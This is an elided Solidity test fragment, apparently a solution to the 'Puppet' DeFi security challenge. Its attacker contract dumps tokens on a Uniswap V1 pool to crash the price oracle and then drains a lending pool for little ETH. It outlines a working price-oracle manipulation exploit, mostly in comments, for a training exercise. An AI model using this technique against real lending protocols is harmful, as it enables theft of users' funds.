...
contract PuppetChallenge is Test {
    ...
    function test_puppet() public checkSolvedByPlayer {
        // Approve attacker contract address (pre-computed CREATE address)
        token.approve(
            address(vm.computeCreateAddress(player, vm.getNonce(player))),
            PLAYER_INITIAL_TOKEN_BALANCE
        );
        new PuppetAttacker{value: player.balance}(
            token,
            lendingPool,
            uniswapV1Exchange,
            recovery,
...
contract PuppetAttacker {
    constructor(
        ...
        // Dump all tokens on Uniswap to crash the price
        token.approve(address(uniswapExchange), playerTokens);
        ...
        // Borrow all tokens from the lending pool (now requires very little ETH)
